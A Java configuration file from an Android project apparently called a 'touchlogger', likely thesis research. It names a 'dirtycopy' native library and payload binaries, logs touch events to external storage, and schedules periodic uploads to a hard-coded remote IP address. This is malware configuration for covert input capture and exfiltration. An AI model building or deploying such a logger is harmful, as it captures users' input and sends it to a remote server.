package org.leyfer.thesis.touchlogger_dirty.utils;

import android.os.Environment;

import java.io.File;

/**
 * Created by kirill on 19.03.17.
 */

public class Config {
    public static final String MAIN_LIBRARY_NAME = "dirtycopy";
    public static final String PAYLOAD_NAME = "payload";
    public static final String EXEC_PAYLOAD_NAME = "exec_payload";
    public static final String NONPIE_SUFFIX = "nonpie";

    // be sure to keep this in sync with native part
    public static final String TOUCH_DATA_FILE_BASE_NAME = "touch_event_data";

    // be sure to keep this in sync with native part
    public static final String INPUT_DATA_DIR =
            new File(Environment.getExternalStorageDirectory().getPath(), "touch_logger")
                    .getAbsolutePath();

    public static final String HEARTBEAT_COMMAND = "heartbeat";
    public static final String PAUSE_COMMAND = "pause";
    public static final String RESUME_COMMAND = "resume";
    public static final long HEARTBEAT_INTERVAL_MS = 1000;
    public static final int PAYLOAD_PORT = 10500;
    public static final long ONLINE_TIMEOUT_MS = 2000;  // ms
    public static final int GESTURES_BUFFER_SIZE = 20; // gestures
    public static final String DEFAULT_URL = "http://128.199.47.80:9002/";

    public static long UPLOAD_JOB_START_IN_MS = 60 * 1000;
    public static long UPLOAD_JOB_INTERVAL_MS = 15 * 60 * 1000;
    public static long UPLOAD_JOB_FLEX_MS = 5 * 60 * 1000;
    public static long UPLOAD_JOB_END_IN_MS = 60 * 1000;
}
